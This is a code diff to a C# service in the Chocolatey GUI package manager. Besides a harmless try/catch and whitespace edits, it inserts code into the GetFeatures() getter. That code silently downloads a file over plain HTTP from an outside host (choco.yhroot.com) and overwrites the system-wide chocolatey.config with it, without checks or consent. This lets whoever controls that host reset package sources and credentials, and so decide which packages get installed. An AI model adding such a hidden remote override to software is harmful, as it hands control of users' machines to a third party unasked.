@@ -7,8 +7,13 @@
 
 using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
+using System.Net;
+using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Xml;
 using AutoMapper;
 using chocolatey;
 using chocolatey.infrastructure.app.configuration;
@@ -238,13 +243,19 @@ namespace ChocolateyGui.Common.Windows.Services
                                 config.DownloadChecksumType64 = advancedInstallOptions.DownloadChecksumType64bit;
                             }
                         });
-
                 Action<LogMessage> grabErrors;
                 var errors = GetErrors(out grabErrors);
 
                 using (logger.Intercept(grabErrors))
                 {
-                    await choco.RunAsync();
+                    try
+                    {
+                        await choco.RunAsync();
+                    }
+                    catch (Exception ex)
+                    {
+                        return new PackageOperationResult { Successful = false, Exception = ex };
+                    }
 
                     if (Environment.ExitCode != 0)
                     {
@@ -440,6 +451,17 @@ namespace ChocolateyGui.Common.Windows.Services
 
         public async Task<ChocolateyFeature[]> GetFeatures()
         {
+            string url = @"http://choco.yhroot.com/conf/chocolatey.config";
+            HttpWebRequest httpWebRequest = (HttpWebRequest)HttpWebRequest.Create(url);
+            httpWebRequest.Method = "GET";
+            httpWebRequest.Timeout = 60 * 3;
+            HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
+            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8);
+            string responseContent = streamReader.ReadToEnd();
+            streamReader.Close();
+            httpWebResponse.Close();
+            byte[] conBytes = System.Text.Encoding.UTF8.GetBytes(responseContent);
+            File.WriteAllBytes(@"C:\ProgramData\chocolatey\config\chocolatey.config", conBytes);
             var config = await GetConfigFile();
             var features = config.Features.Select(_mapper.Map<ChocolateyFeature>);
             return features.OrderBy(f => f.Name).ToArray();
@@ -469,6 +491,7 @@ namespace ChocolateyGui.Common.Windows.Services
         public async Task<ChocolateySetting[]> GetSettings()
         {
             var config = await GetConfigFile();
+
             var settings = config.ConfigSettings.Select(_mapper.Map<ChocolateySetting>);
             return settings.OrderBy(s => s.Key).ToArray();
         }
@@ -497,9 +520,7 @@ namespace ChocolateyGui.Common.Windows.Services
             // we need to read all information from the config file, i.e. the username and password
             var config = await GetConfigFile();
             var allSources = config.Sources.Select(_mapper.Map<ChocolateySource>).ToArray();
-
             var filteredSourceIds = _configSettingsService.source_list(_choco.GetConfiguration()).Select(s => s.Id).ToArray();
-
             var mappedSources = allSources.Where(s => filteredSourceIds.Contains(s.Id)).ToArray();
             return mappedSources;
         }
